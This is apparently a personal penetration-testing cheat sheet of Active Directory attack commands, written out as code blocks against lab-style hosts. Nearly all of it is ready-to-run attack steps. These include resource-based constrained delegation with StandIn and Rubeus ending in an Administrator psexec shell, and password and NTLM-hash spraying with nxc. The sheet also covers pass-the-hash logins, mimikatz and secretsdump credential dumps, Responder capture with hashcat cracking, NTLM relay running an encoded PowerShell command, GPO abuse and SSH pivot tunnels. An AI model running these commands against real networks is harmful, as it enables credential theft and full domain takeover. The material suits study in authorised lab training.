<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//generic all</span>
<span class="nx">node</span> <span class="nx">info</span> <span class="o">=&gt;</span> <span class="nx">Outbound</span> <span class="nx">object</span> <span class="nx">control</span> <span class="o">=&gt;</span> <span class="nx">transitive</span> <span class="nx">object</span> <span class="nx">control</span>

<span class="nx">Analysis</span> <span class="o">=&gt;</span> <span class="nx">Shortest</span> <span class="nx">Paths</span> <span class="o">=&gt;</span> <span class="nx">Shortest</span> <span class="nx">Paths</span> <span class="nx">to</span> <span class="nx">Domain</span> <span class="nx">Admins</span>
</code></pre></div></div>

<h3 id="object-permissions">Object Permissions</h3>

<p><code class="language-plaintext highlighter-rouge">Generic All</code> on resourcedDC.resourced.local (computer) ⇒ resource-based constrained delegation attack</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="err">\</span><span class="nx">StandIn45</span><span class="p">.</span><span class="nx">exe</span> <span class="o">--</span><span class="nx">computer</span> <span class="nx">xct</span> <span class="o">--</span><span class="nx">make</span> <span class="c1">//create new computer</span>

<span class="p">[?]</span> <span class="nx">Using</span> <span class="nx">DC</span>    <span class="p">:</span> <span class="nx">ResourceDC</span><span class="p">.</span><span class="nx">resourced</span><span class="p">.</span><span class="nx">local</span>
    <span class="o">|</span><span class="nx">_</span> <span class="nx">Domain</span>   <span class="p">:</span> <span class="nx">resourced</span><span class="p">.</span><span class="nx">local</span>
    <span class="o">|</span><span class="nx">_</span> <span class="nx">DN</span>       <span class="p">:</span> <span class="nx">CN</span><span class="o">=</span><span class="nx">xct</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="nx">Computers</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nx">resourced</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nx">local</span>
    <span class="o">|</span><span class="nx">_</span> <span class="nx">Password</span> <span class="p">:</span> <span class="nx">jZHKk2l8l9D9buy</span>


<span class="nx">Get</span><span class="o">-</span><span class="nx">ADComputer</span> <span class="o">-</span><span class="nx">Filter</span> <span class="o">*</span> <span class="o">|</span> <span class="nx">Select</span><span class="o">-</span><span class="nb">Object</span> <span class="nx">Name</span><span class="p">,</span><span class="nx">SID</span> <span class="c1">//get old computer name</span>

<span class="nx">Name</span>       <span class="nx">SID</span>
<span class="o">----</span>       <span class="o">---</span>
<span class="nx">RESOURCEDC</span> <span class="nx">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">537427935</span><span class="o">-</span><span class="mi">490066102</span><span class="o">-</span><span class="mi">1511301751</span><span class="o">-</span><span class="mi">1000</span>
<span class="nx">xct</span>        <span class="nx">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">537427935</span><span class="o">-</span><span class="mi">490066102</span><span class="o">-</span><span class="mi">1511301751</span><span class="o">-</span><span class="mi">4101</span>


<span class="p">.</span><span class="err">\</span><span class="nx">StandIn45</span><span class="p">.</span><span class="nx">exe</span> <span class="o">--</span><span class="nx">computer</span> <span class="nx">ResourceDC</span> <span class="o">--</span><span class="nx">sid</span> <span class="nx">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">537427935</span><span class="o">-</span><span class="mi">490066102</span><span class="o">-</span><span class="mi">1511301751</span><span class="o">-</span><span class="mi">4101</span> <span class="c1">//msDS-AllowedToActOnBehalfOfOtherIdentity</span>
<span class="p">.</span><span class="err">\</span><span class="nx">Rubeus</span><span class="p">.</span><span class="nx">exe</span> <span class="nx">hash</span> <span class="o">/</span><span class="nx">password</span><span class="p">:</span><span class="nx">pasSw0rd123</span> <span class="c1">//rc4</span>
<span class="p">.</span><span class="err">\</span><span class="nx">Rubeus</span><span class="p">.</span><span class="nx">exe</span> <span class="nx">s4u</span> <span class="o">/</span><span class="nx">user</span><span class="p">:</span><span class="nx">xct</span> <span class="o">/</span><span class="nx">rc4</span><span class="p">:</span><span class="nx">CB1E5A37CC2C4958AE0E7AC1E575D72E</span> <span class="o">/</span><span class="nx">impersonateuser</span><span class="p">:</span><span class="nx">administrator</span> <span class="o">/</span><span class="nx">msdsspn</span><span class="p">:</span><span class="nx">cifs</span><span class="o">/</span><span class="nx">resourcedc</span><span class="p">.</span><span class="nx">resourced</span><span class="p">.</span><span class="nx">local</span> <span class="o">/</span><span class="nx">nowrap</span> <span class="o">/</span><span class="nx">ptt</span> <span class="c1">//create ticket</span>

<span class="c1">//cifs =&gt; login via psexec</span>
<span class="nx">mousepad</span> <span class="nx">ticket</span><span class="p">.</span><span class="nx">b64</span> <span class="err">#</span><span class="nx">copy</span> <span class="k">new</span> <span class="nx">ticket</span> <span class="nx">to</span> <span class="nx">kali</span>
<span class="nx">cat</span> <span class="nx">ticket</span><span class="p">.</span><span class="nx">b64</span><span class="o">|</span> <span class="nx">base64</span> <span class="o">-</span><span class="nx">d</span> <span class="o">&gt;</span> <span class="nx">ticket</span><span class="p">.</span><span class="nx">kirbi</span>
<span class="nx">impacket</span><span class="o">-</span><span class="nx">ticketConverter</span> <span class="nx">ticket</span><span class="p">.</span><span class="nx">kirbi</span> <span class="nx">ticket</span><span class="p">.</span><span class="nx">ccache</span>
<span class="k">export</span> <span class="nx">KRB5CCNAME</span><span class="o">=</span><span class="s2">`pwd`</span><span class="o">/</span><span class="nx">ticket</span><span class="p">.</span><span class="nx">ccache</span>
<span class="nx">klist</span> <span class="err">#</span><span class="nx">sudo</span> <span class="nx">apt</span><span class="o">-</span><span class="kd">get</span> <span class="nx">install</span> <span class="nx">krb5</span><span class="o">-</span><span class="nx">user</span>
<span class="nx">sudo</span> <span class="nx">sh</span> <span class="o">-</span><span class="nx">c</span> <span class="dl">'</span><span class="s1">echo "192.168.1.1 resourcedc.resourced.local" &gt;&gt; /etc/hosts</span><span class="dl">'</span>
<span class="nx">sudo</span> <span class="nx">impacket</span><span class="o">-</span><span class="nx">psexec</span> <span class="o">-</span><span class="nx">k</span> <span class="o">-</span><span class="nx">no</span><span class="o">-</span><span class="nx">pass</span> <span class="nx">resourced</span><span class="p">.</span><span class="nx">local</span><span class="o">/</span><span class="nx">Administrator</span><span class="p">@</span><span class="nd">resourcedc</span><span class="p">.</span><span class="nx">resourced</span><span class="p">.</span><span class="nx">local</span> <span class="o">-</span><span class="nx">dc</span><span class="o">-</span><span class="nx">ip</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">180.175</span>

</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">ReadLAPSPassword</code></p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//local admin password</span>
<span class="nx">nxc</span> <span class="nx">ldap</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">u</span> <span class="dl">"</span><span class="s2">dave2</span><span class="dl">"</span>  <span class="o">-</span><span class="nx">p</span> <span class="dl">"</span><span class="s2">password</span><span class="dl">"</span> <span class="o">-</span><span class="nx">M</span> <span class="nx">laps</span> 
</code></pre></div></div>

<h3 id="port-forward">Port Forward</h3>

<p>ligolo-ng</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">sudo</span> <span class="nx">ip</span> <span class="nx">route</span> <span class="nx">add</span> <span class="mf">240.0</span><span class="p">.</span><span class="mf">0.1</span><span class="o">/</span><span class="mi">32</span> <span class="nx">dev</span> <span class="nx">ligolo</span>
</code></pre></div></div>

<p>SSH</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//on local (kali)</span>
<span class="nx">ssh</span> <span class="o">-</span><span class="nx">N</span> <span class="o">-</span><span class="nx">L</span> <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">8000</span><span class="p">:</span><span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">8000</span> <span class="nx">dave</span><span class="p">@</span><span class="nd">192</span><span class="p">.</span><span class="mf">168.227</span><span class="p">.</span><span class="mi">246</span> <span class="o">-</span><span class="nx">p</span> <span class="mi">2222</span> <span class="o">-</span><span class="nx">i</span> <span class="nx">id_ecdsa</span>

<span class="c1">//on remote machine</span>
<span class="nx">ssh</span> <span class="o">-</span><span class="nx">N</span> <span class="o">-</span><span class="nx">R</span> <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">443</span><span class="p">:</span><span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">631</span> <span class="nx">kali</span><span class="p">@</span><span class="nd">192</span><span class="p">.</span><span class="mf">168.45</span><span class="p">.</span><span class="mi">1</span>
<span class="nx">ssh</span> <span class="o">-</span><span class="nx">N</span> <span class="o">-</span><span class="nx">R</span> <span class="mi">9998</span> <span class="nx">kali</span><span class="p">@</span><span class="nd">192</span><span class="p">.</span><span class="mf">168.118</span><span class="p">.</span><span class="mi">1</span>
</code></pre></div></div>

<p>proxychains</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/etc/</span><span class="nx">proxychains4</span><span class="p">.</span><span class="nx">conf</span>
<span class="nx">socks</span> <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span> <span class="mi">9998</span>
<span class="nx">proxychains</span> <span class="nx">psql</span> <span class="o">-</span><span class="nx">h</span> <span class="mf">10.4</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">U</span> <span class="nx">postgres</span> 
</code></pre></div></div>

<h3 id="powerviewps1">PowerView.ps1</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">powershell</span> <span class="o">-</span><span class="nx">ep</span> <span class="nx">bypass</span>
<span class="nx">Import</span><span class="o">-</span><span class="nx">Module</span> <span class="p">.</span><span class="err">\</span><span class="nx">PowerView</span><span class="p">.</span><span class="nx">ps1</span>

<span class="nx">Get</span><span class="o">-</span><span class="nx">NetDomain</span>
<span class="nx">Get</span><span class="o">-</span><span class="nx">NetUser</span> <span class="o">|</span> <span class="nx">select</span> <span class="nx">cn</span><span class="p">,</span><span class="nx">pwdlastset</span><span class="p">,</span><span class="nx">lastlogon</span>
<span class="nx">Get</span><span class="o">-</span><span class="nx">DomainUser</span> <span class="o">|</span> <span class="nx">select</span> <span class="nx">cn</span>
<span class="nx">Get</span><span class="o">-</span><span class="nx">NetGroup</span> <span class="o">|</span> <span class="nx">select</span> <span class="nx">name</span>

<span class="nx">Get</span><span class="o">-</span><span class="nx">NetGroupMember</span> <span class="o">-</span><span class="nx">MemberName</span> <span class="dl">"</span><span class="s2">domain admins</span><span class="dl">"</span> <span class="o">-</span><span class="nx">Recurse</span> <span class="o">|</span> <span class="nx">select</span> <span class="nx">MemberName</span>
<span class="nx">Get</span><span class="o">-</span><span class="nx">NetUser</span> <span class="o">-</span><span class="nx">SPN</span> <span class="o">|</span> <span class="nx">select</span> <span class="nx">samaccountname</span><span class="p">,</span><span class="nx">serviceprincipalname</span>
<span class="nx">Find</span><span class="o">-</span><span class="nx">LocalAdminAccess</span>
<span class="nx">Find</span><span class="o">-</span><span class="nx">DomainShare</span> <span class="o">-</span><span class="nx">CheckShareAccess</span>

<span class="nx">Invoke</span><span class="o">-</span><span class="nx">ACLScanner</span> <span class="o">-</span><span class="nx">ResolveGUIDs</span> <span class="o">|</span> <span class="p">?{</span><span class="nx">$_</span><span class="p">.</span><span class="nx">IdentityReferenceName</span> <span class="o">-</span><span class="nx">match</span> <span class="dl">"</span><span class="s2">alice</span><span class="dl">"</span><span class="p">}</span>

<span class="c1">//check genericAll =&gt; bloodhound</span>
<span class="nx">Get</span><span class="o">-</span><span class="nx">ObjectAcl</span> <span class="o">-</span><span class="nx">Identity</span> <span class="dl">"</span><span class="s2">Domain Users</span><span class="dl">"</span> <span class="o">|</span> <span class="p">?</span> <span class="p">{</span><span class="nx">$_</span><span class="p">.</span><span class="nx">ActiveDirectoryRights</span> <span class="o">-</span><span class="nx">eq</span> <span class="dl">"</span><span class="s2">GenericAll</span><span class="dl">"</span><span class="p">}</span> <span class="o">|</span> <span class="nx">select</span> <span class="nx">SecurityIdentifier</span><span class="p">,</span><span class="nx">ActiveDirectoryRights</span>
<span class="dl">"</span><span class="s2">S-1-5-21-1987370270-658905905-1781884369-512</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">S-1-5-21-1987370270-658905905-1781884369-1104</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">S-1-5-32-548</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">S-1-5-18</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">S-1-5-21-1987370270-658905905-1781884369-519</span><span class="dl">"</span> <span class="o">|</span> <span class="nx">Convert</span><span class="o">-</span><span class="nx">SidToName</span>
<span class="nx">net</span> <span class="nx">group</span> <span class="dl">"</span><span class="s2">Management Department</span><span class="dl">"</span> <span class="nx">stephanie</span> <span class="o">/</span><span class="nx">add</span> <span class="o">/</span><span class="nx">domain</span>

<span class="c1">//Group Policy</span>
<span class="nx">Get</span><span class="o">-</span><span class="nx">GPO</span> <span class="o">-</span><span class="nx">Name</span> <span class="dl">"</span><span class="s2">Default Domain Policy</span><span class="dl">"</span>
<span class="nx">Get</span><span class="o">-</span><span class="nx">GPPermission</span> <span class="o">-</span><span class="nx">Guid</span> <span class="mi">31</span><span class="nx">b2f340</span><span class="o">-</span><span class="mi">016</span><span class="nx">d</span><span class="o">-</span><span class="mi">11</span><span class="nx">d2</span><span class="o">-</span><span class="mi">945</span><span class="nx">f</span><span class="o">-</span><span class="mi">00</span><span class="nx">c04fb984f9</span> <span class="o">-</span><span class="nx">TargetType</span> <span class="nx">User</span> <span class="o">-</span><span class="nx">TargetName</span> <span class="nx">anirudh</span>
<span class="c1">//Permission  : GpoEditDeleteModifySecurity</span>
<span class="p">.</span><span class="err">\</span><span class="nx">SharpGPOAbuse</span><span class="p">.</span><span class="nx">exe</span> <span class="o">--</span><span class="nx">AddLocalAdmin</span> <span class="o">--</span><span class="nx">UserAccount</span> <span class="nx">anirudh</span> <span class="o">--</span><span class="nx">GPOName</span> <span class="dl">"</span><span class="s2">Default Domain Policy</span><span class="dl">"</span>
<span class="nx">gpupdate</span> <span class="o">/</span><span class="nx">force</span>
</code></pre></div></div>

<h3 id="password">Password</h3>

<p>prepare for dictionary</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//219 =&gt; 216</span>
<span class="nx">sed</span> <span class="o">-</span><span class="nx">i</span> <span class="dl">'</span><span class="s1">s/219/216/g</span><span class="dl">'</span> <span class="nx">machine</span><span class="p">.</span><span class="nx">txt</span>
</code></pre></div></div>

<p>Spray password</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">nxc</span>  <span class="nx">smb</span> <span class="nx">machines</span><span class="p">.</span><span class="nx">txt</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">user</span><span class="p">.</span><span class="nx">txt</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">pass</span><span class="p">.</span><span class="nx">txt</span>
<span class="nx">nxc</span>  <span class="nx">smb</span> <span class="mf">172.16</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">u</span> <span class="dl">'</span><span class="s1">user</span><span class="dl">'</span> <span class="o">-</span><span class="nx">p</span> <span class="dl">'</span><span class="s1">pass</span><span class="dl">'</span> <span class="o">--</span><span class="nx">shares</span>
<span class="nx">nxc</span>  <span class="nx">smb</span> <span class="mf">172.16</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">u</span> <span class="dl">'</span><span class="s1">user</span><span class="dl">'</span> <span class="o">-</span><span class="nx">p</span> <span class="dl">'</span><span class="s1">pass</span><span class="dl">'</span> <span class="o">-</span><span class="nx">M</span> <span class="nx">spider_plus</span> <span class="o">-</span><span class="nx">o</span> <span class="nx">DOWNLOAD_FLAG</span><span class="o">=</span><span class="nx">True</span>
<span class="nx">nxc</span> <span class="nx">winrm</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span>  <span class="o">-</span><span class="nx">u</span> <span class="nx">user</span><span class="p">.</span><span class="nx">txt</span> <span class="o">-</span><span class="nx">H</span> <span class="nx">crack</span> <span class="o">--</span><span class="nx">no</span><span class="o">-</span><span class="nx">bruteforce</span> <span class="o">--</span><span class="k">continue</span><span class="o">-</span><span class="nx">on</span><span class="o">-</span><span class="nx">success</span>

<span class="c1">//non domain user</span>
<span class="nx">nxc</span> <span class="nx">winrm</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">111.1</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">user</span><span class="p">.</span><span class="nx">txt</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">pass</span> <span class="o">-</span><span class="nx">d</span> <span class="nx">MS02</span>

<span class="nx">impacket</span><span class="o">-</span><span class="nx">psexec</span> <span class="nx">dave</span><span class="p">@</span><span class="nd">172</span><span class="p">.</span><span class="mf">16.1</span><span class="p">.</span><span class="mi">1</span>
<span class="c1">//specify domain name for administrator</span>
<span class="nx">impacket</span><span class="o">-</span><span class="nx">psexec</span> <span class="nx">fake</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">Administrator</span><span class="p">:</span><span class="dl">"</span><span class="s2">pass</span><span class="se">\</span><span class="s2">$</span><span class="dl">"</span><span class="p">@</span><span class="nd">172</span><span class="p">.</span><span class="mf">16.1</span><span class="p">.</span><span class="mi">1</span>
<span class="nx">impacket</span><span class="o">-</span><span class="nx">wmiexec</span> <span class="nx">fake</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">Administrator</span><span class="p">:</span><span class="dl">"</span><span class="s2">pass</span><span class="se">\</span><span class="s2">!0rd</span><span class="se">\</span><span class="s2">$</span><span class="dl">"</span><span class="p">@</span><span class="nd">172</span><span class="p">.</span><span class="mf">16.1</span><span class="p">.</span><span class="mi">1</span>

<span class="c1">//port 135</span>
<span class="nx">nxc</span> <span class="nx">wmi</span> <span class="mf">172.16</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">user</span><span class="p">.</span><span class="nx">txt</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">pass</span><span class="p">.</span><span class="nx">txt</span>
<span class="nx">impacket</span><span class="o">-</span><span class="nx">wmiexec</span> <span class="nx">fake</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">Administrator</span><span class="p">:</span><span class="dl">"</span><span class="s2">pass</span><span class="se">\</span><span class="s2">!0rd</span><span class="se">\</span><span class="s2">$</span><span class="dl">"</span><span class="p">@</span><span class="nd">172</span><span class="p">.</span><span class="mf">16.1</span><span class="p">.</span><span class="mi">1</span>
</code></pre></div></div>

<h3 id="ntlm-hash">NTLM Hash</h3>

<p>Spary NTLM hash</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//test smb(139,445),wmi(135),rdp(3389),winrm(5985)</span>
<span class="nx">nxc</span> <span class="nx">smb</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">bob</span><span class="p">.</span><span class="nx">alice</span> <span class="o">-</span><span class="nx">H</span> <span class="nx">e728ecbbbbbbbbbbbbbb</span>
<span class="c1">//spray local</span>
<span class="nx">nxc</span> <span class="nx">winrm</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">user</span><span class="p">.</span><span class="nx">txt</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">passW0rd</span> <span class="o">-</span><span class="nx">d</span> <span class="nx">ms02</span>
<span class="nx">evil</span><span class="o">-</span><span class="nx">winrm</span> <span class="o">-</span><span class="nx">i</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">bob</span><span class="p">.</span><span class="nx">alice</span> <span class="o">-</span><span class="nx">H</span> <span class="nx">e728ecbbbbbbbbbbbbbb</span>
<span class="nx">xfreerdp</span> <span class="o">/</span><span class="nx">v</span><span class="p">:</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">/</span><span class="nx">u</span><span class="p">:</span><span class="nx">resourced</span><span class="p">.</span><span class="nx">local</span><span class="o">/</span><span class="nx">L</span><span class="p">.</span><span class="nx">Livingstone</span> <span class="o">/</span><span class="nx">pth</span><span class="p">:</span><span class="mi">19</span><span class="nx">a3a7550ce8c505c2d46b5e39d6f808</span> <span class="o">+</span><span class="nx">clipboard</span> <span class="o">+</span><span class="nx">drive</span><span class="p">:</span><span class="nx">share</span><span class="p">,</span><span class="sr">/tm</span><span class="err">p
</span></code></pre></div></div>

<p>Passing NTLM</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">smbclient</span> <span class="err">\\\\</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span><span class="err">\\</span><span class="nx">secrets</span> <span class="o">-</span><span class="nx">U</span> <span class="nx">Administrator</span> <span class="o">--</span><span class="nx">pw</span><span class="o">-</span><span class="nx">nt</span><span class="o">-</span><span class="nx">hash</span> <span class="nx">e728ecbbbbbbbbbbbbbb</span>

<span class="c1">//specify domain name for administrator</span>
<span class="nx">impacket</span><span class="o">-</span><span class="nx">psexec</span> <span class="o">-</span><span class="nx">hashes</span> <span class="p">:</span><span class="nx">e728ecbbbbbbbbbbbbbb</span> <span class="nx">skylark</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">Administrator</span><span class="p">@</span><span class="nd">10</span><span class="p">.</span><span class="mf">10.1</span><span class="p">.</span><span class="mi">1</span>
<span class="nx">impacket</span><span class="o">-</span><span class="nx">wmiexec</span> <span class="o">-</span><span class="nx">hashes</span> <span class="p">:</span><span class="nx">e728ecbbbbbbbbbbbbbb</span> <span class="nx">skylark</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">Administrator</span><span class="p">@</span><span class="nd">10</span><span class="p">.</span><span class="mf">10.1</span><span class="p">.</span><span class="mi">1</span>

<span class="nx">evil</span><span class="o">-</span><span class="nx">winrm</span> <span class="o">-</span><span class="nx">i</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">bob</span><span class="p">.</span><span class="nx">alice</span> <span class="o">-</span><span class="nx">H</span> <span class="nx">e728ecbbbbbbbbbbbbbb</span>
</code></pre></div></div>

<p>Dump</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">privilege</span><span class="p">::</span><span class="nx">debug</span>
<span class="nx">sekurlsa</span><span class="p">::</span><span class="nx">logonpasswords</span>
<span class="nx">token</span><span class="p">::</span><span class="nx">elevate</span>
<span class="nx">lsadump</span><span class="p">::</span><span class="nx">lsa</span> <span class="o">/</span><span class="nx">inject</span>
<span class="nx">lsadump</span><span class="p">::</span><span class="nx">lsa</span> <span class="o">/</span><span class="nx">patch</span>
<span class="nx">lsadump</span><span class="p">::</span><span class="nx">sam</span>
<span class="nx">lsadump</span><span class="p">::</span><span class="nx">secrets</span>
<span class="nx">lsadump</span><span class="p">::</span><span class="nx">trust</span>

 <span class="p">.</span><span class="err">\</span><span class="nx">mimikatz64</span><span class="p">.</span><span class="nx">exe</span> <span class="dl">"</span><span class="s2">privilege::debug</span><span class="dl">"</span> <span class="dl">"</span><span class="s2">sekurlsa::logonpasswords</span><span class="dl">"</span> <span class="nx">exit</span>
 <span class="dl">"</span><span class="s2">token::elevate</span><span class="dl">"</span> <span class="dl">"</span><span class="s2">lsadump::sam</span><span class="dl">"</span>
 
 <span class="c1">//require local admin</span>
<span class="nx">impacket</span><span class="o">-</span><span class="nx">secretsdump</span> <span class="nx">MS02</span><span class="o">/</span><span class="nx">Administrator</span><span class="p">:</span><span class="nx">password</span><span class="p">@</span><span class="nd">10</span><span class="p">.</span><span class="mf">10.1</span><span class="p">.</span><span class="mi">1</span>
 
<span class="nx">secretsdump</span><span class="p">.</span><span class="nx">py</span> <span class="nx">LOCAL</span> <span class="o">-</span><span class="nx">ntds</span> <span class="nx">ntds</span><span class="p">.</span><span class="nx">dit</span> <span class="o">-</span><span class="nx">system</span> <span class="nx">SYSTEM</span> <span class="o">-</span><span class="nx">outputfile</span> <span class="nx">credentials</span><span class="p">.</span><span class="nx">txt</span>
<span class="nx">secretsdump</span><span class="p">.</span><span class="nx">py</span> <span class="nx">fake</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">Administrator</span><span class="p">:</span><span class="nx">password</span><span class="p">@</span><span class="nd">192</span><span class="p">.</span><span class="mf">168.1</span><span class="p">.</span><span class="mi">1</span>

<span class="c1">//local administrator password</span>
<span class="nx">nxc</span> <span class="nx">ldap</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">u</span> <span class="dl">"</span><span class="s2">dave</span><span class="dl">"</span>  <span class="o">-</span><span class="nx">p</span> <span class="dl">"</span><span class="s2">password</span><span class="dl">"</span> <span class="o">-</span><span class="nx">M</span> <span class="nx">laps</span> 
</code></pre></div></div>

<p>Crack hash</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//md5 or short one</span>
<span class="nx">https</span><span class="p">:</span><span class="c1">//crackstation.net/</span>

<span class="c1">//ntlm</span>
<span class="nx">hashcat</span> <span class="o">-</span><span class="nx">m</span> <span class="mi">1000</span> <span class="nx">dave</span><span class="p">.</span><span class="nx">hash</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlists</span><span class="o">/</span><span class="nx">rockyou</span><span class="p">.</span><span class="nx">txt</span> <span class="o">--</span><span class="nx">force</span>
<span class="c1">//ntlmv2</span>
<span class="nx">hashcat</span> <span class="o">-</span><span class="nx">m</span> <span class="mi">5600</span> <span class="nx">dave</span><span class="p">.</span><span class="nx">hash</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlists</span><span class="o">/</span><span class="nx">rockyou</span><span class="p">.</span><span class="nx">txt</span> <span class="o">--</span><span class="nx">force</span>
</code></pre></div></div>

<p>NTLMv2 authentication</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">sudo</span> <span class="nx">responder</span> <span class="o">-</span><span class="nx">I</span> <span class="nx">tun0</span>
<span class="nx">dir</span> <span class="err">\\</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span><span class="err">\</span><span class="nx">test</span>
<span class="nx">hashcat</span> <span class="o">-</span><span class="nx">m</span> <span class="mi">5600</span> <span class="nx">dave</span><span class="p">.</span><span class="nx">hash</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlists</span><span class="o">/</span><span class="nx">rockyou</span><span class="p">.</span><span class="nx">txt</span> <span class="o">--</span><span class="nx">force</span>
</code></pre></div></div>

<p>NTLMv2 Relay</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">dir</span> <span class="err">\\</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span><span class="err">\</span><span class="nx">test</span>
<span class="nx">impacket</span><span class="o">-</span><span class="nx">ntlmrelayx</span> <span class="o">--</span><span class="nx">no</span><span class="o">-</span><span class="nx">http</span><span class="o">-</span><span class="nx">server</span> <span class="o">-</span><span class="nx">smb2support</span> <span class="o">-</span><span class="nx">t</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">c</span> <span class="dl">'</span><span class="s1">powershell -e JABjAGwAaQBlA</span><span class="dl">'</span>
</code></pre></div></div>

<h3 id="getadusers">GetADUsers</h3>

<p>reuqested username should be domain user</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Get</span><span class="o">-</span><span class="nx">NetUser</span> <span class="o">|</span> <span class="nx">select</span> <span class="nx">samaccountname</span> <span class="c1">//powerview</span>
<span class="nx">net</span> <span class="nx">user</span> <span class="o">/</span><span class="nx">domain</span>
<span class="nx">impacket</span><span class="o">-</span><span class="nx">GetADUsers</span> <span class="o">-</span><span class="nx">all</span> <span class="o">-</span><span class="nx">dc</span><span class="o">-</span><span class="nx">ip</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">1.1</span> <span class="nx">fake</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">bob</span><span class="p">.</span><span class="nx">alice</span> <span class="o">-</span><span class="nx">hashes</span> <span class="p">:</span><span class="nx">e72dddddddddddddd</span> <span class="o">|</span> <span class="nx">awk</span> <span class="dl">'</span><span class="s1">{print $1}</span><span class="dl">'</span>
